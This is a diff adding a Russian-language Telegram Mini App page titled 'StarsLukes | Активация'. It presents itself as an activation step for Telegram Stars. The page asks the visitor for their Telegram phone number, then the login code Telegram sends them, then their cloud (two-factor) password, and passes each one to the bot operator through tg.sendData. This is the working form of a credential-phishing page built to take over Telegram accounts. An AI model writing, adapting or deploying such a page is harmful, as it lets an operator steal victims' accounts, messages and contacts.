@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>StarsLukes | Активация</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0f0f0f; color: #fff; display: flex;
+            align-items: center; justify-content: center; height: 100vh;
+            flex-direction: column; padding: 20px;
+        }
+        .card {
+            background: #1c1c1c; border-radius: 20px; padding: 30px;
+            box-shadow: 0 0 25px rgba(0,160,255,0.3); max-width: 360px; width: 100%;
+        }
+        h3 { font-size: 1.2rem; margin-bottom: 20px; text-align: center; color: #d0ebff; }
+        input {
+            width: 100%; padding: 12px; border: 1px solid #333;
+            background: #2a2a2a; color: #fff; border-radius: 12px;
+            font-size: 1rem; margin-bottom: 15px; outline: none;
+        }
+        .btn {
+            width: 100%; padding: 14px; border: none; border-radius: 14px;
+            background: linear-gradient(135deg, #1e90ff, #0077ff);
+            color: #fff; font-weight: bold; font-size: 1.1rem; cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn:active { transform: scale(0.97); }
+        .hidden { display: none; }
+        .logo { font-size: 2rem; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">⭐</div>
+        <div id="step1">
+            <h3>📱 Введите номер телефона Telegram</h3>
+            <input type="tel" id="phoneInput" placeholder="+79991234567">
+            <button class="btn" onclick="requestCode()">Отправить код</button>
+        </div>
+        <div id="step2" class="hidden">
+            <h3>✉️ Код из Telegram</h3>
+            <input type="text" id="codeInput" placeholder="12345" maxlength="5">
+            <button class="btn" onclick="verifyCode()">Подтвердить</button>
+        </div>
+        <div id="step3" class="hidden">
+            <h3>🔐 Облачный пароль</h3>
+            <input type="password" id="passwordInput" placeholder="Пароль">
+            <button class="btn" onclick="sendPassword()">Войти</button>
+        </div>
+    </div>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        function requestCode() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone.startsWith('+')) {
+                tg.showAlert('Номер должен начинаться с +');
+                return;
+            }
+            tg.sendData(JSON.stringify({ step: "send_code", phone: phone }));
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        function verifyCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            if (!/^\d{5}$/.test(code)) {
+                tg.showAlert('Код — 5 цифр');
+                return;
+            }
+            tg.sendData(JSON.stringify({ step: "verify_code", code: code }));
+        }
+
+        function sendPassword() {
+            const password = document.getElementById('passwordInput').value;
+            tg.sendData(JSON.stringify({ step: "password", password: password }));
+        }
+    </script>
+</body>
+</html>
